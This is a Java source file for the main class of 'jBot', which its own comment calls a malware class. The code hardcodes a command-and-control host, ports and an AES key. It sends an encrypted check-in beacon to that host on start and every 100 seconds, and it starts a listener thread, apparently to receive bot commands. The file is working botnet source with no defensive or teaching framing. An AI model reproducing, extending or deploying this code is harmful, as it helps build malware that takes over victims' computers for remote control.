package me.aaronakhtar.jbot;

import me.aaronakhtar.jbot.crypto.Aes;
import me.aaronakhtar.jbot.threads.Listener;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class JBot { // jBot main malware class, prob not much documentation.

    public static int malware_port = 899;
    public static String cnc_host = "main.aaronakhtar.me";
    public static int listener_port = 455;
    public static String secret_key = "IOF145JKLABFIOUAB48JKA13124JVABGFUIOHAISFN";
    public static List<Thread> threads = new ArrayList<>();

    public static void main(String[] args){ //
        sendJoinPckt();
        new Listener().start();
        sendConsistant.start();
    }

    public static Thread sendConsistant = new Thread(){
        @Override
        public void run(){
            while(true){
                sendJoinPckt();
                try{
                Thread.sleep(100 * 1000);}catch (Exception e){

                }
            }
        }
    };

    // connection packet to cnc
    private static void sendJoinPckt() {
        try {
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(cnc_host, listener_port), 10000);
            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
            writer.println(Aes.encrypt("C0nn3cted", secret_key));
            writer.flush();
            writer.close();
            socket.close();
        }catch (IOException e){

        }
    }

}
